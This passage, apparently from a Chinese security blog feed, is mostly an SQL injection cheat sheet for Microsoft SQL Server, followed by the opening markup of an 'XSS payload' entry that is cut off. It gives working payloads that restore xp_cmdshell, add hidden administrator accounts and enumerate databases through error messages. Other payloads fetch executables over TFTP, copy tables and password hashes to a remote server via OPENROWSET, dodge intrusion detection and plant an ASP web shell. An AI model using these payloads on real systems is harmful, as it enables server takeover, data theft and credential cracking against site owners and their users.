class="number">1</span>=(<span class="keyword">SELECT</span> <span class="keyword">count</span>(*) <span class="keyword">FROM</span> master.dbo.sysobjects <span class="keyword">WHERE</span> xtype = X <span class="keyword">AND</span> <span class="keyword">name</span> = xp_cmdshell)<span class="comment">--</span></span><br><span class="line">xp_cmdshell被删除，恢复，支持绝对路径的恢复</span><br><span class="line">;EXEC master.dbo.sp_addextendedproc xp_cmdshell,xplog70.dll<span class="comment">--</span></span><br><span class="line">;EXEC master.dbo.sp_addextendedproc xp_cmdshell,c:\inetpub\wwwroot\xplog70.dll<span class="comment">--</span></span><br><span class="line">反向PING自己实验</span><br><span class="line">;<span class="keyword">use</span> <span class="keyword">master</span>;<span class="keyword">declare</span> @s <span class="built_in">int</span>;exec sp_oacreate "wscript.shell",@s out;exec sp_oamethod @s,"run",NULL,"cmd.exe /c ping 192.168.0.1";<span class="comment">--</span></span><br><span class="line">加帐号</span><br><span class="line">;<span class="keyword">DECLARE</span> @shell <span class="built_in">INT</span> EXEC SP_OACREATEwscript.shell,@shell <span class="keyword">OUTPUT</span> EXEC SP_OAMETHOD @shell,run,<span class="literal">null</span>,C:\WINNT\system32\cmd.exe</span><br><span class="line">/c net <span class="keyword">user</span> jiaoniang$ <span class="number">1866574</span> /<span class="keyword">add</span><span class="comment">--</span></span><br><span class="line">创建一个虚拟目录E盘：</span><br><span class="line">;<span class="keyword">declare</span> @o <span class="built_in">int</span> exec sp_oacreatewscript.shell,@o <span class="keyword">out</span> exec sp_oamethod @o,run,<span class="literal">NULL</span>,cscript.exec:\inetpub\wwwroot\mkwebdir.vbs -w <span class="string">"默认Web站点"</span> -v <span class="string">"e"</span>,<span class="string">"e：\"--</span></span><br><span class="line"><span class="string">访问属性：（配合写入一个webshell）</span></span><br><span class="line"><span class="string">declare @o int exec sp_oacreate wscript.shell,@o out exec sp_oamethod @o,run,NULL,cscript.exec:\inetpub\wwwroot\chaccess.vbs -a w3svc/1/ROOT/e +browse</span></span><br><span class="line"><span class="string">爆库 特殊技巧：：%5c=\ 或者把/和\ 修改%5提交</span></span><br><span class="line"><span class="string">and 0&lt;&gt;(select top 1 paths from newtable)--</span></span><br><span class="line"><span class="string">得到库名（从1到5都是系统的id，6以上才可以判断）</span></span><br><span class="line"><span class="string">and 1=(select name from master.dbo.sysdatabases where dbid=7)--</span></span><br><span class="line"><span class="string">and 0&lt;&gt;(select count(*) from master.dbo.sysdatabases where name&gt;1 and dbid=6)</span></span><br><span class="line"><span class="string">依次提交 dbid = 7,8,9.... 得到更多的数据库名</span></span><br><span class="line"><span class="string">and 0&lt;&gt;(select top 1 name from bbs.dbo.sysobjects where xtype=U) 暴到一个表 假设为 admin</span></span><br><span class="line"><span class="string">and 0&lt;&gt;(select top 1 name from bbs.dbo.sysobjects where xtype=U and name not in (Admin)) 来得到其他的表。</span></span><br><span class="line"><span class="string">and 0&lt;&gt;(select count(*) from bbs.dbo.sysobjects where xtype=U and name=admin</span></span><br><span class="line"><span class="string">and uid&gt;(str(id))) 暴到UID的数值假设为18779569 uid=id</span></span><br><span class="line"><span class="string">and 0&lt;&gt;(select top 1 name from bbs.dbo.syscolumns where id=18779569) 得到一个admin的一个字段，假设为 user_id</span></span><br><span class="line"><span class="string">and 0&lt;&gt;(select top 1 name from bbs.dbo.syscolumns where id=18779569 and name not in</span></span><br><span class="line"><span class="string">(id,...)) 来暴出其他的字段</span></span><br><span class="line"><span class="string">and 0&lt;(select user_id from BBS.dbo.admin where username&gt;1) 可以得到用户名</span></span><br><span class="line"><span class="string">依次可以得到密码。假设存在user_id username,password 等字段</span></span><br><span class="line"><span class="string">and 0&lt;&gt;(select count(*) from master.dbo.sysdatabases where name&gt;1 and dbid=6)</span></span><br><span class="line"><span class="string">and 0&lt;&gt;(select top 1 name from bbs.dbo.sysobjects where xtype=U) 得到表名</span></span><br><span class="line"><span class="string">and 0&lt;&gt;(select top 1 name from bbs.dbo.sysobjects where xtype=U and name not in(Address))</span></span><br><span class="line"><span class="string">and 0&lt;&gt;(select count(*) from bbs.dbo.sysobjects where xtype=U and name=admin and uid&gt;(str(id))) 判断id值</span></span><br><span class="line"><span class="string">and 0&lt;&gt;(select top 1 name from BBS.dbo.syscolumns where id=773577794) 所有字段</span></span><br><span class="line"><span class="string">id=-1 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,* from admin</span></span><br><span class="line"><span class="string">id=-1 union select 1,2,3,4,5,6,7,8,*,9,10,11,12,13 from admin (union，access也好用）</span></span><br><span class="line"><span class="string">得到WEB路径</span></span><br><span class="line"><span class="string">;create table [dbo].[swap] ([swappass][char](255));--</span></span><br><span class="line"><span class="string">and (select top 1 swappass from swap)=1--</span></span><br><span class="line"><span class="string">;CREATE TABLE newtable(id int IDENTITY(1,1),paths varchar(500)) Declare @test varchar(20) exec master..xp_regread</span></span><br><span class="line"><span class="string">@rootkey=HKEY_LOCAL_MACHINE,@key=SYSTEM\CurrentControlSet\Services\W3SVC\Parameters\Virtual Roots\,@value_name=/,</span></span><br><span class="line"><span class="string">values=@testOUTPUT insert into paths(path) values(@test)--</span></span><br><span class="line"><span class="string">;use ku1;--</span></span><br><span class="line"><span class="string">;create table cmd (str image);-- 建立image类型的表cmd</span></span><br><span class="line"><span class="string">存在xp_cmdshell的测试过程：</span></span><br><span class="line"><span class="string">;exec master..xp_cmdshell dir</span></span><br><span class="line"><span class="string">;exec master.dbo.sp_addlogin jiaoniang$;-- 加SQL帐号</span></span><br><span class="line"><span class="string">;exec master.dbo.sp_password null,jiaoniang$,1866574;--</span></span><br><span class="line"><span class="string">;exec master.dbo.sp_addsrvrolemember jiaoniang$ sysadmin;--</span></span><br><span class="line"><span class="string">;exec master.dbo.xp_cmdshell net user jiaoniang$ 1866574 /workstations:* /times:all /passwordchg:yes /passwordreq:yes</span></span><br><span class="line"><span class="string">/active:yes /add;--</span></span><br><span class="line"><span class="string">;exec master.dbo.xp_cmdshell net localgroup administrators jiaoniang$ /add;--</span></span><br><span class="line"><span class="string">exec master..xp_servicecontrol start,schedule 启动服务</span></span><br><span class="line"><span class="string">exec master..xp_servicecontrol start,server</span></span><br><span class="line"><span class="string">; DECLARE @shell INT EXEC SP_OACREATE wscript.shell,@shell OUTPUT EXEC SP_OAMETHOD @shell,run,null,C：\WINNT\system32</span></span><br><span class="line"><span class="string">\cmd.exe /c net user jiaoniang$ 1866574 /add</span></span><br><span class="line"><span class="string">;DECLARE @shell INT EXEC SP_OACREATE wscript.shell,@shell OUTPUT EXEC SP_OAMETHOD @shell,run,null,C：\WINNT\system32\cmd.exe</span></span><br><span class="line"><span class="string">/c net localgroup administrators jiaoniang$ /add</span></span><br><span class="line"><span class="string">; exec master..xp_cmdshell tftp -i youip get file.exe-- 利用TFTP上传文件</span></span><br><span class="line"><span class="string">;declare @a sysname set @a=xp_+cmdshell exec @a dir c:\</span></span><br><span class="line"><span class="string">;declare @a sysname set @a=xp+_cm’+’dshell exec @a dir c:\</span></span><br><span class="line"><span class="string">;declare @a;set @a=db_name();backup database @a to disk=你的IP你的共享目录bak.dat</span></span><br><span class="line"><span class="string">如果被限制则可以。</span></span><br><span class="line"><span class="string">select * from openrowset(sqloledb,server;sa;,select OK! exec master.dbo.sp_addlogin hax)</span></span><br><span class="line"><span class="string">查询构造：</span></span><br><span class="line"><span class="string">SELECT * FROM news WHERE id=... AND topic=... AND .....</span></span><br><span class="line"><span class="string">adminand 1=(select count(*) from [user] where username=victim and right(left(userpass,01),1)=1) and userpass &lt;&gt;</span></span><br><span class="line"><span class="string">select 123;--</span></span><br><span class="line"><span class="string">;use master;--</span></span><br><span class="line"><span class="string">:a or name like fff%;-- 显示有一个叫ffff的用户哈。</span></span><br><span class="line"><span class="string">and 1&lt;&gt;(select count(email) from [user]);--</span></span><br><span class="line"><span class="string">;update [users] set email=(select top 1 name from sysobjects where xtype=u and status&gt;0) where name=ffff;--</span></span><br><span class="line"><span class="string">;update [users] set email=(select top 1 id from sysobjects where xtype=u and name=ad) where name=ffff;--</span></span><br><span class="line"><span class="string">;update [users] set email=(select top 1 name from sysobjects where xtype=u and id&gt;581577110) where name=ffff;--</span></span><br><span class="line"><span class="string">;update [users] set email=(select top 1 count(id) from password) where name=ffff;--</span></span><br><span class="line"><span class="string">;update [users] set email=(select top 1 pwd from password where id=2) where name=ffff;--</span></span><br><span class="line"><span class="string">;update [users] set email=(select top 1 name from password where id=2) where name=ffff;--</span></span><br><span class="line"><span class="string">上面的语句是得到数据库中的第一个用户表，并把表名放在ffff用户的邮箱字段中。</span></span><br><span class="line"><span class="string">通过查看ffff的用户资料可得第一个用表叫ad</span></span><br><span class="line"><span class="string">然后根据表名ad得到这个表的ID 得到第二个表的名字</span></span><br><span class="line"><span class="string">insert into users values( 666,char(0x63)+char(0x68)+char(0x72)+char(0x69)+char(0x73),char(0x63)+char(0x68)+char(0x72)+char</span></span><br><span class="line"><span class="string">(0x69)+char(0x73),0xffff)--</span></span><br><span class="line"><span class="string">insert into users values( 667,123,123,0xffff)--</span></span><br><span class="line"><span class="string">insert into users values ( 123,admin--,password,0xffff)--</span></span><br><span class="line"><span class="string">;and user&gt;0</span></span><br><span class="line"><span class="string">;and (select count(*) from sysobjects)&gt;0</span></span><br><span class="line"><span class="string">;and (select count(*) from mysysobjects)&gt;0 //为access数据库</span></span><br><span class="line"><span class="string">枚举出数据表名</span></span><br><span class="line"><span class="string">;update aaa set aaa=(select top 1 name from sysobjects where xtype=u and status&gt;0);--</span></span><br><span class="line"><span class="string">这是将第一个表名更新到aaa的字段处。</span></span><br><span class="line"><span class="string">读出第一个表，第二个表可以这样读出来（在条件后加上 and name&lt;&gt;；刚才得到的表名）。</span></span><br><span class="line"><span class="string">;update aaa set aaa=(select top 1 name from sysobjects where xtype=u and status&gt;0 and name&lt;&gt;vote);--</span></span><br><span class="line"><span class="string">然后id=1552 and exists(select * from aaa where aaa&gt;5)</span></span><br><span class="line"><span class="string">读出第二个表，一个个的读出，直到没有为止。</span></span><br><span class="line"><span class="string">读字段是这样：</span></span><br><span class="line"><span class="string">;update aaa set aaa=(select top 1 col_name(object_id（表名），1));--</span></span><br><span class="line"><span class="string">然后id=152 and exists(select * from aaa where aaa&gt;5)出错，得到字段名</span></span><br><span class="line"><span class="string">;update aaa set aaa=(select top 1 col_name(object_id（表名），2));--</span></span><br><span class="line"><span class="string">然后id=152 and exists(select * from aaa where aaa&gt;5)出错，得到字段名</span></span><br><span class="line"><span class="string">[获得数据表名][将字段值更新为表名，再想法读出这个字段的值就可得到表名]</span></span><br><span class="line"><span class="string">update 表名 set 字段=(select top 1 name from sysobjects where xtype=u and status&gt;0 [ and name&lt;&gt;；你得到的表名 查出一个加一个])</span></span><br><span class="line"><span class="string">[ where 条件] select top 1 name from sysobjects where xtype=u and status&gt;0 and name not in(table1,table2，…）</span></span><br><span class="line"><span class="string">通过SQLSERVER注入漏洞建数据库管理员帐号和系统管理员帐号[当前帐号必须是SYSADMIN组]</span></span><br><span class="line"><span class="string">[获得数据表字段名][将字段值更新为字段名，再想法读出这个字段的值就可得到字段名]</span></span><br><span class="line"><span class="string">update 表名 set 字段=(select top 1 col_name(object_id（要查询的数据表名），字段列如：1) [ where 条件]</span></span><br><span class="line"><span class="string">绕过IDS的检测[使用变量]</span></span><br><span class="line"><span class="string">;declare @a sysname set @a=xp_+cmdshell exec @a dir c:\</span></span><br><span class="line"><span class="string">;declare @a sysname set @a=xp+_cm’+’dshell exec @a dir c:\</span></span><br><span class="line"><span class="string">开启远程数据库</span></span><br><span class="line"><span class="string">基本语法</span></span><br><span class="line"><span class="string">select * from OPENROWSET(SQLOLEDB,server=servername;uid=sa;pwd=123,select * from table1 )</span></span><br><span class="line"><span class="string">参数： (1) OLEDB Provider name</span></span><br><span class="line"><span class="string">其中连接字符串参数可以是任何端口用来连接，比如</span></span><br><span class="line"><span class="string">select * from OPENROWSET(SQLOLEDB,uid=sa;pwd=123;Network=DBMSSOCN;Address=192.168.0.1,1433;,select * from table</span></span><br><span class="line"><span class="string">复制目标主机的整个数据库insert所有远程表到本地表。</span></span><br><span class="line"><span class="string">基本语法：</span></span><br><span class="line"><span class="string">insert into OPENROWSET(SQLOLEDB,server=servername;uid=sa;pwd=123,select * from table1) select * from table2</span></span><br><span class="line"><span class="string">这行语句将目标主机上table2表中的所有数据复制到远程数据库中的table1表中。实际运用中适当修改连接字符串的IP地址和端口，指向需要的地方，比如：</span></span><br><span class="line"><span class="string">insert into OPENROWSET(SQLOLEDB,uid=sa;pwd=123;Network=DBMSSOCN;Address=192.168.0.1,1433;,select * from table1) select * from</span></span><br><span class="line"><span class="string">table2</span></span><br><span class="line"><span class="string">insert into OPENROWSET(SQLOLEDB,uid=sa;pwd=123;Network=DBMSSOCN;Address=192.168.0.1,1433;,select * from _sysdatabases)</span></span><br><span class="line"><span class="string">select * from master.dbo.sysdatabases</span></span><br><span class="line"><span class="string">insert into OPENROWSET(SQLOLEDB,uid=sa;pwd=123;Network=DBMSSOCN;Address=192.168.0.1,1433;,select * from _sysobjects)</span></span><br><span class="line"><span class="string">select * from user_database.dbo.sysobjects</span></span><br><span class="line"><span class="string">insert into OPENROWSET(SQLOLEDB,uid=sa;pwd=123;Network=DBMSSOCN;Address=192.168.0.1,1433;,select * from _syscolumns)</span></span><br><span class="line"><span class="string">select * from user_database.dbo.syscolumns</span></span><br><span class="line"><span class="string">复制数据库：</span></span><br><span class="line"><span class="string">insert into OPENROWSET(SQLOLEDB,uid=sa;pwd=123;Network=DBMSSOCN;Address=192.168.0.1,1433;,select * from table1) select * from database..table1 insert into OPENROWSET(SQLOLEDB,uid=sa;pwd=123;Network=DBMSSOCN;Address=192.168.0.1,1433;,select * from table2) select * fromdatabase..table2</span></span><br><span class="line"><span class="string">复制哈西表（HASH）登录密码的hash存储于sysxlogins中。方法如下：</span></span><br><span class="line"><span class="string">insert into OPENROWSET(SQLOLEDB,uid=sa;pwd=123;Network=DBMSSOCN;Address=192.168.0.1,1433;,select * from _sysxlogins) select</span></span><br><span class="line"><span class="string">* from database.dbo.sysxlogins</span></span><br><span class="line"><span class="string">得到hash之后，就可以进行暴力破解。</span></span><br><span class="line"><span class="string">遍历目录的方法：先创建一个临时表：temp</span></span><br><span class="line"><span class="string">;create table temp(id nvarchar(255),num1 nvarchar(255),num2 nvarchar(255),num3 nvarchar(255));--</span></span><br><span class="line"><span class="string">;insert temp exec master.dbo.xp_availablemedia;-- 获得当前所有驱动器</span></span><br><span class="line"><span class="string">;insert into temp(id) exec master.dbo.xp_subdirs c:\;-- 获得子目录列表</span></span><br><span class="line"><span class="string">;insert into temp(id,num1) exec master.dbo.xp_dirtree c:\;-- 获得所有子目录的目录树结构，并寸入temp表中</span></span><br><span class="line"><span class="string">;insert into temp(id) exec master.dbo.xp_cmdshell type c:\web\index.asp;-- 查看某个文件的内容</span></span><br><span class="line"><span class="string">;insert into temp(id) exec master.dbo.xp_cmdshell dir c:\;--</span></span><br><span class="line"><span class="string">;insert into temp(id) exec master.dbo.xp_cmdshell dir c:\ *.asp /s/a;--</span></span><br><span class="line"><span class="string">;insert into temp(id) exec master.dbo.xp_cmdshell cscript. C:\Inetpub\AdminScripts\adsutil.vbs enum w3svc</span></span><br><span class="line"><span class="string">;insert into temp(id,num1) exec master.dbo.xp_dirtree c:\;-- （xp_dirtree适用权限PUBLIC）</span></span><br><span class="line"><span class="string">写入表：</span></span><br><span class="line"><span class="string">语句1：and 1=(SELECT IS_SRVROLEMEMBER(sysadmin));--</span></span><br><span class="line"><span class="string">语句2：and 1=(SELECT IS_SRVROLEMEMBER(serveradmin));--</span></span><br><span class="line"><span class="string">语句3：and 1=(SELECT IS_SRVROLEMEMBER(setupadmin));--</span></span><br><span class="line"><span class="string">语句4：and 1=(SELECT IS_SRVROLEMEMBER(securityadmin));--</span></span><br><span class="line"><span class="string">语句5：and 1=(SELECT IS_SRVROLEMEMBER(securityadmin));--</span></span><br><span class="line"><span class="string">语句6：and 1=(SELECT IS_SRVROLEMEMBER(diskadmin));--</span></span><br><span class="line"><span class="string">语句7：and 1=(SELECT IS_SRVROLEMEMBER(bulkadmin));--</span></span><br><span class="line"><span class="string">语句8：and 1=(SELECT IS_SRVROLEMEMBER(bulkadmin));--</span></span><br><span class="line"><span class="string">语句9：and 1=(SELECT IS_MEMBER(db_owner));--</span></span><br><span class="line"><span class="string">把路径写到表中去：</span></span><br><span class="line"><span class="string">;create table dirs(paths varchar(100),id int)--</span></span><br><span class="line"><span class="string">;insert dirs exec master.dbo.xp_dirtree c:\--</span></span><br><span class="line"><span class="string">and 0&lt;&gt;(select top 1 paths from dirs)--</span></span><br><span class="line"><span class="string">and 0&lt;&gt;(select top 1 paths from dirs where paths not in(@Inetpub))--</span></span><br><span class="line"><span class="string">;create table dirs1(paths varchar(100),id int)--</span></span><br><span class="line"><span class="string">;insert dirs exec master.dbo.xp_dirtree e:\web--</span></span><br><span class="line"><span class="string">and 0&lt;&gt;(select top 1 paths from dirs1)--</span></span><br><span class="line"><span class="string">把数据库备份到网页目录：下载</span></span><br><span class="line"><span class="string">;declare @a sysname; set @a=db_name();backup database @a to disk=e:\web\down.bak;--</span></span><br><span class="line"><span class="string">and 1=(Select top 1 name from(Select top 12 id,name from sysobjects where xtype=char(85)) T order by id desc)</span></span><br><span class="line"><span class="string">and 1=(Select Top 1 col_name(object_id(USER_LOGIN),1) from sysobjects) 参看相关表。</span></span><br><span class="line"><span class="string">and 1=(select user_id from USER_LOGIN)</span></span><br><span class="line"><span class="string">and 0=(select user from USER_LOGIN where user&gt;1)</span></span><br><span class="line"><span class="string">-=-wscript.shellexample -=-</span></span><br><span class="line"><span class="string">declare @o int</span></span><br><span class="line"><span class="string">exec sp_oacreate wscript.shell,@o out</span></span><br><span class="line"><span class="string">exec sp_oamethod @o,run,NULL,notepad.exe</span></span><br><span class="line"><span class="string">; declare @o int exec sp_oacreate wscript.shell,@o out exec sp_oamethod @o,run,NULL,notepad.exe--</span></span><br><span class="line"><span class="string">declare @o int,@f int,@t int,@ret int</span></span><br><span class="line"><span class="string">declare @line varchar(8000)</span></span><br><span class="line"><span class="string">exec sp_oacreate scripting.filesystemobject,@o out</span></span><br><span class="line"><span class="string">exec sp_oamethod @o,opentextfile,@f out,c:\boot.ini,1</span></span><br><span class="line"><span class="string">exec @ret = sp_oamethod @f,readline,@line out</span></span><br><span class="line"><span class="string">while( @ret = 0 )</span></span><br><span class="line"><span class="string">begin</span></span><br><span class="line"><span class="string">print @line</span></span><br><span class="line"><span class="string">exec @ret = sp_oamethod @f,readline,@line out</span></span><br><span class="line"><span class="string">end</span></span><br><span class="line"><span class="string">declare @o int,@f int,@t int,@ret int</span></span><br><span class="line"><span class="string">exec sp_oacreate scripting.filesystemobject,@o out</span></span><br><span class="line"><span class="string">exec sp_oamethod @o,createtextfile,@f out,c:\inetpub\wwwroot\foo.asp,1</span></span><br><span class="line"><span class="string">exec @ret = sp_oamethod @f,writeline,NULL,</span></span><br><span class="line"><span class="string">&lt;% set o = server.createobject("</span>wscript.shell<span class="string">"): o.run( request.querystring("</span>cmd<span class="string">") ) %&gt;</span></span><br><span class="line"><span class="string">declare @o int,@ret int</span></span><br><span class="line"><span class="string">exec sp_oacreate speech.voicetext,@o out</span></span><br><span class="line"><span class="string">exec sp_oamethod @o,register,NULL,foo,bar</span></span><br><span class="line"><span class="string">exec sp_oasetproperty @o,speed,150</span></span><br><span class="line"><span class="string">exec sp_oamethod @o,speak,NULL,all your sequel servers are belong to,us,528 waitfor delay 00:00:05</span></span><br><span class="line"><span class="string">; declare @o int,@ret int exec sp_oacreate speech.voicetext,@o out exec sp_oamethod @o,register,NULL,foo,bar exec</span></span><br><span class="line"><span class="string">sp_oasetproperty @o,speed,150 exec sp_oamethod @o,speak,NULL,all your sequel servers are belong to us,528 waitfor delay 00:00:05--</span></span><br><span class="line"><span class="string">xp_dirtree适用权限PUBLIC</span></span><br><span class="line"><span class="string">exec master.dbo.xp_dirtree c:\</span></span><br><span class="line"><span class="string">返回的信息有两个字段subdirectory、depth。Subdirectory字段是字符型，depth字段是整形字段。</span></span><br><span class="line"><span class="string">create table dirs(paths varchar(100),id int)</span></span><br><span class="line"><span class="string">建表，这里建的表是和上面xp_dirtree相关连，字段相等、类型相同。</span></span><br><span class="line"><span class="string">insert dirs exec master.dbo.xp_dirtree c:\</span></span><br><span class="line"><span class="string">只要我们建表与存储进程返回的字段相定义相等就能够执行！达到写表的效果.</span></span><br></pre></td></tr></table></figure><h1 id="SQL注入案例"><a href="#SQL注入案例" class="headerlink" title="SQL注入案例"></a><font color="#3399FF">SQL注入案例</font></h1><h1 id="未完待续……"><a href="#未完待续……" class="headerlink" title=" 未完待续…… "></a><font color="#3399FF"> 未完待续…… </font></h1>]]></content>
      
      
      <categories>
          
          <category> Web漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL注入介绍 </tag>
            
            <tag> SQL注入攻击 </tag>
            
            <tag> SQL注入盲注 </tag>
            
            <tag> SQL手工注入小结 </tag>
            
            <tag> SQL绕过防注入系统方法 </tag>
            
            <tag> SQL注入常用语句场景 </tag>
            
            <tag> SQL注入案例 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>XSS payload 合集</title>
      <link href="/2019/03/20/XSS%E5%B8%B8%E7%94%A8payload/"/>
      <url>/2019/03/20/XSS%E5%B8%B8%E7%94%A8payload/</url>
      
        <content type="html"><![CDATA[<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span 